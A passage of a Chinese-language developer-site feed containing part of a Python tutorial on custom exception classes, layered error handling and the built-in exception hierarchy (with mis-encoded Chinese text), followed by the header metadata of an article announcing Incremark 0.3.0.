    <span class="hljs-string">"""ä¸šåŠ¡å±‚å¼‚å¸¸ï¼ˆè®°å½•æ—¥å¿—ï¼Œè½¬æ¢ä¸ºUserErrorï¼‰"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">DataError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""æ•°æ®å±‚å¼‚å¸¸ï¼ˆè®°å½•è¯¦ç»†æ—¥å¿—ï¼‰"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-comment"># æ•°æ®å±‚</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">save_to_database</span>(<span class="hljs-params">data</span>):
    <span class="hljs-keyword">try</span>:
        db.insert(data)
    <span class="hljs-keyword">except</span> DatabaseError <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">raise</span> DataError(<span class="hljs-string">f"æ•°æ®åº“æ“ä½œå¤±è´¥: <span class="hljs-subst">{e}</span>"</span>) <span class="hljs-keyword">from</span> e

<span class="hljs-comment"># ä¸šåŠ¡å±‚</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_user_order</span>(<span class="hljs-params">order</span>):
    <span class="hljs-keyword">try</span>:
        save_to_database(order)
        send_notification(order)
    <span class="hljs-keyword">except</span> DataError <span class="hljs-keyword">as</span> e:
        log_error(e)  <span class="hljs-comment"># è®°å½•æŠ€æœ¯ç»†èŠ‚</span>
        <span class="hljs-keyword">raise</span> UserError(<span class="hljs-string">"è®¢å•å¤„ç†å¤±è´¥ï¼Œè¯·è”ç³»å®¢æœ"</span>) <span class="hljs-keyword">from</span> e  <span class="hljs-comment"># è½¬æ¢ä¸ºç”¨æˆ·å‹å¥½çš„å¼‚å¸¸</span>

<span class="hljs-comment"># ç”¨æˆ·å±‚ï¼ˆå±•ç¤ºç»™ç”¨æˆ·ï¼‰</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_request</span>():
    <span class="hljs-keyword">try</span>:
        process_user_order(order_data)
    <span class="hljs-keyword">except</span> UserError <span class="hljs-keyword">as</span> e:
        show_error_message(<span class="hljs-built_in">str</span>(e))  <span class="hljs-comment"># æ˜¾ç¤ºå‹å¥½ä¿¡æ¯</span>
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        log_error(e)
        show_error_message(<span class="hljs-string">"ç³»ç»Ÿé”™è¯¯ï¼Œè¯·ç¨åé‡è¯•"</span>)
</code></pre>
</li>
<li>
<p>ä¼˜åŠ¿5ï¼šæ¡†æ¶/åº“çš„APIè®¾è®¡ ğŸ“š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä¼˜åŠ¿ï¼šåº“ä½¿ç”¨è€…å¯ä»¥ç²¾ç¡®åŒºåˆ†ä¸åŒé”™è¯¯ç±»å‹ï¼</span>
<span class="hljs-comment"># ä½œä¸ºä¸€ä¸ªåº“ä½œè€…ï¼Œæä¾›æ¸…æ™°çš„å¼‚å¸¸æ¥å£</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DataProcessor</span>:
    <span class="hljs-string">"""æ•°æ®å¤„ç†åº“"""</span>
    
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataFormatError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
        <span class="hljs-string">"""æ•°æ®æ ¼å¼é”™è¯¯"""</span>
        <span class="hljs-keyword">pass</span>
    
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">ValidationError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
        <span class="hljs-string">"""æ•°æ®éªŒè¯é”™è¯¯"""</span>
        <span class="hljs-keyword">pass</span>
    
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProcessingError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
        <span class="hljs-string">"""å¤„ç†è¿‡ç¨‹é”™è¯¯"""</span>
        <span class="hljs-keyword">pass</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process</span>(<span class="hljs-params">self, data</span>):
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self._validate_format(data):
            <span class="hljs-keyword">raise</span> DataFormatError(<span class="hljs-string">"æ•°æ®æ ¼å¼ä¸æ­£ç¡®"</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self._validate_content(data):
            <span class="hljs-keyword">raise</span> ValidationError(<span class="hljs-string">"æ•°æ®å†…å®¹ä¸ç¬¦åˆè¦æ±‚"</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self._process_data(data):
            <span class="hljs-keyword">raise</span> ProcessingError(<span class="hljs-string">"å¤„ç†è¿‡ç¨‹å¤±è´¥"</span>)

<span class="hljs-comment"># åº“ä½¿ç”¨è€…</span>
processor = DataProcessor()
<span class="hljs-keyword">try</span>:
    processor.process(user_data)
<span class="hljs-keyword">except</span> DataFormatError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"è¯·æä¾›æ­£ç¡®æ ¼å¼çš„æ•°æ®"</span>)
<span class="hljs-keyword">except</span> ValidationError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ•°æ®å†…å®¹æœ‰è¯¯"</span>)
<span class="hljs-keyword">except</span> ProcessingError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"å¤„ç†å¤±è´¥ï¼Œè¯·é‡è¯•"</span>)
</code></pre>
</li>
</ul>
<h3 data-id="heading-21">4.6 å®é™…å¯¹æ¯”ç¤ºä¾‹ï¼Œåœºæ™¯ä¸º ä¸€ä¸ªç®€å•çš„ç”¨æˆ·æ³¨å†ŒåŠŸèƒ½ï¼Œ</h3>
<ul>
<li>
<p>æ–¹å¼2æ›´æ¸…æ™°ã€æ›´æ˜“ç»´æŠ¤</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ========== æ–¹å¼1ï¼šåªç”¨å†…ç½®å¼‚å¸¸ ==========</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">register_user</span>(<span class="hljs-params">username, email, password</span>):
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username:
        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"ç”¨æˆ·åä¸èƒ½ä¸ºç©º"</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-string">'@'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> email:
        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"é‚®ç®±æ ¼å¼é”™è¯¯"</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(password) &lt; <span class="hljs-number">8</span>:
        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"å¯†ç é•¿åº¦ä¸è¶³"</span>)
    <span class="hljs-comment"># ... æ³¨å†Œé€»è¾‘</span>

<span class="hljs-comment"># ä½¿ç”¨æ—¶</span>
<span class="hljs-keyword">try</span>:
    register_user(<span class="hljs-string">""</span>, <span class="hljs-string">"invalid"</span>, <span class="hljs-string">"short"</span>)
<span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:
    <span class="hljs-comment"># æ‰€æœ‰é”™è¯¯éƒ½æ˜¯ValueErrorï¼Œæ— æ³•åŒºåˆ†</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ³¨å†Œå¤±è´¥:"</span>, e)
    <span class="hljs-comment"># å¦‚ä½•çŸ¥é“æ˜¯å“ªä¸ªå­—æ®µé”™äº†ï¼Ÿéœ€è¦è§£æå­—ç¬¦ä¸²ï¼Œå¾ˆè„†å¼±ï¼</span>
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ========== æ–¹å¼2ï¼šä½¿ç”¨è‡ªå®šä¹‰å¼‚å¸¸ ==========</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">RegistrationError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""æ³¨å†Œå¼‚å¸¸åŸºç±»"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">UsernameError</span>(<span class="hljs-title class_ inherited__">RegistrationError</span>):
    <span class="hljs-string">"""ç”¨æˆ·åé”™è¯¯"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">EmailError</span>(<span class="hljs-title class_ inherited__">RegistrationError</span>):
    <span class="hljs-string">"""é‚®ç®±é”™è¯¯"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">PasswordError</span>(<span class="hljs-title class_ inherited__">RegistrationError</span>):
    <span class="hljs-string">"""å¯†ç é”™è¯¯"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">register_user</span>(<span class="hljs-params">username, email, password</span>):
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username:
        <span class="hljs-keyword">raise</span> UsernameError(<span class="hljs-string">"ç”¨æˆ·åä¸èƒ½ä¸ºç©º"</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-string">'@'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> email:
        <span class="hljs-keyword">raise</span> EmailError(<span class="hljs-string">"é‚®ç®±æ ¼å¼é”™è¯¯"</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(password) &lt; <span class="hljs-number">8</span>:
        <span class="hljs-keyword">raise</span> PasswordError(<span class="hljs-string">"å¯†ç é•¿åº¦ä¸è¶³"</span>)
    <span class="hljs-comment"># ... æ³¨å†Œé€»è¾‘</span>

<span class="hljs-comment"># ä½¿ç”¨æ—¶</span>
<span class="hljs-keyword">try</span>:
    register_user(<span class="hljs-string">""</span>, <span class="hljs-string">"invalid"</span>, <span class="hljs-string">"short"</span>)
<span class="hljs-keyword">except</span> UsernameError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"è¯·è¾“å…¥ç”¨æˆ·å"</span>)
<span class="hljs-keyword">except</span> EmailError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"è¯·è¾“å…¥æœ‰æ•ˆçš„é‚®ç®±åœ°å€"</span>)
<span class="hljs-keyword">except</span> PasswordError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"å¯†ç é•¿åº¦è‡³å°‘8ä½"</span>)
<span class="hljs-keyword">except</span> RegistrationError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ³¨å†Œå¤±è´¥ï¼Œè¯·æ£€æŸ¥è¾“å…¥"</span>)
</code></pre>
</li>
</ul>
<h2 data-id="heading-22">5ã€Python å†…ç½® å¼‚å¸¸æŠ›å‡º</h2>
<ul>
<li>Pythonä¸­çš„<strong>try-except</strong>è¯­å¥å¯ä»¥æ•è·<strong>ä»»ä½•</strong>ç»§æ‰¿<strong>è‡ªBaseExceptionçš„å¼‚å¸¸</strong>ã€‚</li>
</ul>
<h3 data-id="heading-23">5.1 python å†…ç½®çš„å¼‚å¸¸ å±‚æ¬¡ç»“æ„</h3>
<ul>
<li>
<p>å››å¤§ç³»ç»Ÿçº§å¼‚å¸¸ (ç›´æ¥ç»§æ‰¿BaseException)</p>
<pre><code class="hljs language-python" lang="python">å¼‚å¸¸ç±»å‹	          è§¦å‘åœºæ™¯	            ä»£ç è®¾è®¡å»ºè®®æ•è·	            åŸå› 
Exception        æ‰€æœ‰å¸¸è§„å¼‚å¸¸çš„çˆ¶ç±»        å…¶å­ç±» âœ… åº”è¯¥	   å¸¸è§„ç¨‹åºé”™è¯¯ï¼Œåº”è¯¥å¤„ç†
KeyboardInterrupt	ç”¨æˆ·æŒ‰ Ctrl+C	        âš ï¸ è°¨æ…	           ä»…ç”¨äºæ¸…ç†èµ„æºï¼Œä¸è¦å®Œå…¨å¿½ç•¥
SystemExit	        sys.exit() è°ƒç”¨	        âŒ ä¸å»ºè®®	      è®©ç¨‹åºæ­£å¸¸é€€å‡ºï¼Œé™¤éæœ‰ç‰¹æ®Šéœ€æ±‚
GeneratorExit	    ç”Ÿæˆå™¨å…³é—­	            âŒ ä¸éœ€è¦	      ç”Ÿæˆå™¨å†…éƒ¨é€šå¸¸ä¸éœ€è¦å¤„ç†
</code></pre>
</li>
<li>
<p>ç®€åŒ–ç»“æ„</p>
<pre><code class="hljs language-python" lang="python">BaseException
â”œâ”€â”€ SystemExit
â”œâ”€â”€ KeyboardInterrupt
â”œâ”€â”€ GeneratorExit
â”œâ”€â”€ Exception
    â”œâ”€â”€ StopIteration
    â”œâ”€â”€ ArithmeticError
    â”‚   â”œâ”€â”€ ZeroDivisionError
    â”‚   â””â”€â”€ FloatingPointError
    â”œâ”€â”€ LookupError
    â”‚   â”œâ”€â”€ IndexError
    â”‚   â””â”€â”€ KeyError
    â”œâ”€â”€ OSError
    â”œâ”€â”€ ValueError
    â”œâ”€â”€ TypeError
    â””â”€â”€ RuntimeError
</code></pre>
</li>
<li>
<p>åŸºæœ¬å±‚çº§æ¶æ„é€»è¾‘ä¸º</p>
<pre><code class="hljs language-scss" lang="scss">BaseException (é¡¶å±‚)
    â†“
Exception (ä¸­å±‚ - ç”¨æˆ·å¯æ•è·çš„å¼‚å¸¸)
    â†“
å…·ä½“å¼‚å¸¸ç±» (åº•å±‚ - å…·ä½“é”™è¯¯ç±»å‹)
</code></pre>
</li>
</ul>
<h3 data-id="heading-24">5.2 ExceptionåŠå…¶å­ç±» æ•è·</h3>
<ul>
<li>
<p><strong>Exceptionæœ¬èº«ä¸ä¼šç›´æ¥è¢«æŠ›å‡º</strong>ï¼Œä½†å¯ä»¥ç”¨try-exceptæ•è·æ‰€æœ‰ç»§æ‰¿è‡ªExceptionçš„å¼‚å¸¸ã€‚</p>
</li>
<li>
<p>Exception ç±»æ•è· ä»£ç ç¤ºä¾‹</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ•è· Exception æœ¬èº«</span>
<span class="hljs-keyword">try</span>:
    <span class="hljs-comment"># ä»»ä½•ç»§æ‰¿è‡ª Exception çš„å¼‚å¸¸éƒ½ä¼šè¢«æ•è·</span>
    <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"å€¼é”™è¯¯"</span>)
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ•è·åˆ°Exceptionå­ç±»: <span class="hljs-subst">{<span class="hljs-built_in">type</span>(e).__name__}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ¶ˆæ¯: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ•è· Exception çš„å­ç±»</span>
<span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"å€¼é”™è¯¯"</span>)
<span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:  <span class="hljs-comment"># ValueError æ˜¯ Exception çš„å­ç±»</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ•è·åˆ° ValueError: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ•è·å¤šä¸ªå¼‚å¸¸ç±»</span>
<span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">"ç±»å‹é”™è¯¯"</span>)
<span class="hljs-keyword">except</span> (ValueError, TypeError, KeyError) <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ•è·åˆ°å¼‚å¸¸: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
</li>
<li>
<p>Exception å­ç±» by åŠŸèƒ½é¢†åŸŸçš„ä¸å®Œå…¨åˆ†ç»„ï¼š</p>
<ul>
<li>
<p>ç®—æœ¯åŸŸ</p>
<pre><code class="hljs language-python" lang="python">ArithmeticError     <span class="hljs-comment"># ç®—æœ¯é”™è¯¯</span>
    â”œâ”€â”€ FloatingPointError  <span class="hljs-comment"># ç²¾åº¦é—®é¢˜</span>
    â”œâ”€â”€ OverflowError       <span class="hljs-comment"># èŒƒå›´æº¢å‡º</span>
    â””â”€â”€ ZeroDivisionError   <span class="hljs-comment"># é™¤é›¶é”™è¯¯</span>
</code></pre>
</li>
<li>
<p>æŸ¥æ‰¾åŸŸ</p>
<pre><code class="hljs language-python" lang="python">LookupError     <span class="hljs-comment"># æŸ¥æ‰¾é”™è¯¯</span>
    â”œâ”€â”€ IndexError   <span class="hljs-comment"># åºåˆ—ç´¢å¼•é”™è¯¯</span>
    â””â”€â”€ KeyError     <span class="hljs-comment"># æ˜ å°„é”®é”™è¯¯</span>
</code></pre>
</li>
<li>
<p>I/O åŸŸ</p>
<pre><code class="hljs language-python" lang="python">OSError (å¤§é‡å­ç±»)
    â”œâ”€â”€ FileNotFoundError    <span class="hljs-comment"># æ–‡ä»¶ä¸å­˜åœ¨</span>
    â”œâ”€â”€ PermissionError      <span class="hljs-comment"># æƒé™é—®é¢˜</span>
    â”œâ”€â”€ TimeoutError         <span class="hljs-comment"># è¶…æ—¶</span>
    â””â”€â”€ ... (æ›´å¤šç³»ç»Ÿé”™è¯¯)
</code></pre>
</li>
<li>
<p>ValueError - å€¼é”™è¯¯</p>
<ul>
<li>int("abc")  # æ— æ³•è½¬æ¢ä¸ºæ•´æ•°</li>
</ul>
</li>
<li>
<p>TypeError - ç±»å‹é”™è¯¯</p>
<ul>
<li>"1" + 2  # ç±»å‹ä¸åŒ¹é…</li>
</ul>
</li>
<li>
<p>AttributeError - å±æ€§é”™è¯¯</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> math
math.sqrt(<span class="hljs-string">"abc"</span>)  <span class="hljs-comment"># math å¯¹è±¡æ²¡æœ‰ sqrt å±æ€§ï¼ˆå®é™…ä¸Šæœ‰ï¼Œä½†å‚æ•°ç±»å‹é”™è¯¯ï¼‰</span>
</code></pre>
</li>
<li>
<p>ImportError - å¯¼å…¥é”™è¯¯</p>
<pre><code class="hljs language-bash" lang="bash">ImportError         <span class="hljs-comment"># æ¨¡å—å¯¼å…¥å¤±è´¥</span>
    â””â”€â”€ ModuleNotFoundError   <span class="hljs-comment"># æ‰¾ä¸åˆ°æ¨¡å—</span>
</code></pre>
</li>
<li>
<p>RuntimeError - è¿è¡Œæ—¶é”™è¯¯</p>
<pre><code class="hljs language-bash" lang="bash">RuntimeError        <span class="hljs-comment"># è¿è¡Œæ—¶é”™è¯¯åŸºç±»</span>
   â”œâ”€â”€ NotImplementedError   <span class="hljs-comment"># æœªå®ç°çš„æ–¹æ³•</span>
   â””â”€â”€ RecursionError        <span class="hljs-comment"># é€’å½’æ·±åº¦è¶…é™</span>
</code></pre>
</li>
<li>
<p>åŒç±»é”™è¯¯å½’ä¸ºä¸€ç»„ï¼Œä¾¿äºæ‰¹é‡æ•è·ï¼ˆå¦‚ except LookupError: åŒæ—¶å¤„ç†IndexErrorå’ŒKeyErrorï¼‰ã€‚</p>
</li>
</ul>
</li>
</ul>
<h2 data-id="heading-25">6 è¡¥å……å¤‡ç”¨ï¼š python å¼‚å¸¸ å®Œæ•´å±‚æ¬¡ç»“æ„</h2>
<pre><code class="hljs language-php" lang="php">```python
BaseException
â”œâ”€â”€ SystemExit                    <span class="hljs-comment"># sys.exit()å¼•å‘</span>
â”œâ”€â”€ KeyboardInterrupt             <span class="hljs-comment"># ç”¨æˆ·ä¸­æ–­æ‰§è¡Œ(Ctrl+C)</span>
â”œâ”€â”€ GeneratorExit                 <span class="hljs-comment"># ç”Ÿæˆå™¨å…³é—­æ—¶å¼•å‘</span>
â””â”€â”€ <span class="hljs-built_in">Exception</span>                     <span class="hljs-comment"># æ‰€æœ‰ç”¨æˆ·å®šä¹‰å¼‚å¸¸çš„åŸºç±»</span>
    â”œâ”€â”€ StopIteration             <span class="hljs-comment"># è¿­ä»£å™¨æ²¡æœ‰æ›´å¤šå€¼</span>
    â”œâ”€â”€ StopAsyncIteration        <span class="hljs-comment"># å¼‚æ­¥è¿­ä»£å™¨</span>
    â”œâ”€â”€ <span class="hljs-built_in">ArithmeticError</span>           <span class="hljs-comment"># ç®—æœ¯é”™è¯¯åŸºç±»</span>
    â”‚   â”œâ”€â”€ FloatingPointError    <span class="hljs-comment"># æµ®ç‚¹è®¡ç®—å¤±è´¥</span>
    â”‚   â”œâ”€â”€ OverflowError         <span class="hljs-comment"># æ•°å€¼æº¢å‡º</span>
    â”‚   â””â”€â”€ ZeroDivisionError     <span class="hljs-comment"># é™¤ä»¥é›¶</span>
    â”œâ”€â”€ <span class="hljs-built_in">AssertionError</span>            <span class="hljs-comment"># assertè¯­å¥å¤±è´¥</span>
    â”œâ”€â”€ AttributeError            <span class="hljs-comment"># å±æ€§å¼•ç”¨å¤±è´¥</span>
    â”œâ”€â”€ BufferError               <span class="hljs-comment"># ç¼“å†²åŒºæ“ä½œå¤±è´¥</span>
    â”œâ”€â”€ EOFError                  <span class="hljs-comment"># è¾“å…¥ç»“æŸ</span>
    â”œâ”€â”€ ImportError               <span class="hljs-comment"># æ¨¡å—å¯¼å…¥å¤±è´¥</span>
    â”‚   â””â”€â”€ ModuleNotFoundError   <span class="hljs-comment"># æ‰¾ä¸åˆ°æ¨¡å—</span>
    â”œâ”€â”€ LookupError               <span class="hljs-comment"># æŸ¥æ‰¾å¤±è´¥åŸºç±»</span>
    â”‚   â”œâ”€â”€ IndexError           <span class="hljs-comment"># ç´¢å¼•è¶…å‡ºèŒƒå›´</span>
    â”‚   â””â”€â”€ KeyError              <span class="hljs-comment"># å­—å…¸é”®ä¸å­˜åœ¨</span>
    â”œâ”€â”€ MemoryError               <span class="hljs-comment"># å†…å­˜ä¸è¶³</span>
    â”œâ”€â”€ NameError                 <span class="hljs-comment"># å±€éƒ¨/å…¨å±€åç§°ä¸å­˜åœ¨</span>
    â”‚   â””â”€â”€ UnboundLocalError     <span class="hljs-comment"># è®¿é—®æœªåˆå§‹åŒ–çš„å±€éƒ¨å˜é‡</span>
    â”œâ”€â”€ OSError                   <span class="hljs-comment"># æ“ä½œç³»ç»Ÿé”™è¯¯åŸºç±»</span>
    â”‚   â”œâ”€â”€ BlockingIOError       <span class="hljs-comment"># æ“ä½œä¼šé˜»å¡</span>
    â”‚   â”œâ”€â”€ ChildProcessError     <span class="hljs-comment"># å­è¿›ç¨‹æ“ä½œå¤±è´¥</span>
    â”‚   â”œâ”€â”€ ConnectionError       <span class="hljs-comment"># è¿æ¥ç›¸å…³é”™è¯¯åŸºç±»</span>
    â”‚   â”‚   â”œâ”€â”€ BrokenPipeError   <span class="hljs-comment"># ç®¡é“ç ´è£‚</span>
    â”‚   â”‚   â”œâ”€â”€ ConnectionAbortedError
    â”‚   â”‚   â”œâ”€â”€ ConnectionRefusedError
    â”‚   â”‚   â””â”€â”€ ConnectionResetError
    â”‚   â”œâ”€â”€ FileExistsError       <span class="hljs-comment"># æ–‡ä»¶å·²å­˜åœ¨</span>
    â”‚   â”œâ”€â”€ FileNotFoundError    <span class="hljs-comment"># æ–‡ä»¶æœªæ‰¾åˆ°</span>
    â”‚   â”œâ”€â”€ InterruptedError      <span class="hljs-comment"># ç³»ç»Ÿè°ƒç”¨ä¸­æ–­</span>
    â”‚   â”œâ”€â”€ IsADirectoryError     <span class="hljs-comment"># æ“ä½œç›®å½•è€Œéæ–‡ä»¶</span>
    â”‚   â”œâ”€â”€ NotADirectoryError    <span class="hljs-comment"># æ“ä½œæ–‡ä»¶è€Œéç›®å½•</span>
    â”‚   â”œâ”€â”€ PermissionError       <span class="hljs-comment"># æƒé™ä¸è¶³</span>
    â”‚   â””â”€â”€ TimeoutError          <span class="hljs-comment"># æ“ä½œè¶…æ—¶</span>
    â”œâ”€â”€ ReferenceError            <span class="hljs-comment"># å¼±å¼•ç”¨è®¿é—®å·²åˆ é™¤å¯¹è±¡</span>
    â”œâ”€â”€ RuntimeError              <span class="hljs-comment"># è¿è¡Œæ—¶é”™è¯¯åŸºç±»</span>
    â”‚   â”œâ”€â”€ NotImplementedError   <span class="hljs-comment"># æœªå®ç°çš„æ–¹æ³•</span>
    â”‚   â””â”€â”€ RecursionError        <span class="hljs-comment"># é€’å½’æ·±åº¦è¶…é™</span>
    â”œâ”€â”€ SyntaxError               <span class="hljs-comment"># è¯­æ³•é”™è¯¯</span>
    â”‚   â””â”€â”€ IndentationError      <span class="hljs-comment"># ç¼©è¿›é”™è¯¯</span>
    â”‚       â””â”€â”€ TabError          <span class="hljs-comment"># Tabå’Œç©ºæ ¼æ··ç”¨</span>
    â”œâ”€â”€ SystemError               <span class="hljs-comment"># è§£é‡Šå™¨å†…éƒ¨é”™è¯¯</span>
    â”œâ”€â”€ <span class="hljs-built_in">TypeError</span>                 <span class="hljs-comment"># ç±»å‹é”™è¯¯</span>
    â”œâ”€â”€ ValueError                <span class="hljs-comment"># å€¼é”™è¯¯</span>
    â””â”€â”€ Warning                   <span class="hljs-comment"># è­¦å‘ŠåŸºç±»</span>
        â”œâ”€â”€ DeprecationWarning
        â”œâ”€â”€ PendingDeprecationWarning
        â”œâ”€â”€ RuntimeWarning
        â”œâ”€â”€ SyntaxWarning
        â”œâ”€â”€ UserWarning
        â”œâ”€â”€ FutureWarning
        â”œâ”€â”€ ImportWarning
        â”œâ”€â”€ UnicodeWarning
        â””â”€â”€ BytesWarning
```
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Incremark 0.3.0 å‘å¸ƒï¼šåŒå¼•æ“æ¶æ„ + å®Œæ•´æ’ä»¶ç”Ÿæ€ï¼ŒAI æµå¼æ¸²æŸ“çš„ç»ˆææ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7592508079305785363</link>    <guid>https://juejin.cn/post/7592508079305785363</guid>    <pubDate>2026-01-08T03:06:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592508079305785363" data-draft-id="7592452108798672939" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Incremark 0.3.0 å‘å¸ƒï¼šåŒå¼•æ“æ¶æ„ + å®Œæ•´æ’ä»¶ç”Ÿæ€ï¼ŒAI æµå¼æ¸²æŸ“çš„ç»ˆææ–¹æ¡ˆ"/> <meta itemprop="keywords" content="å‰ç«¯,äººå·¥æ™ºèƒ½,å¼€æº"/> <meta itemprop="datePublished" content="2026-01-08T03:06:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="kingç‹ä¸€å¸…"/> <meta itemprop="url" content="https://juejin.cn/user/395479917018408"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Incremark 0.3.0 å‘å¸ƒï¼šåŒå¼•æ“æ¶æ„ + å®Œæ•´æ’ä»¶ç”Ÿæ€ï¼ŒAI æµå¼æ¸²æŸ“çš„ç»ˆææ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/395479917018408/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    kingç‹ä¸€å¸…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:06:39.000Z" title="Thu Jan 08 2026 03:06:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
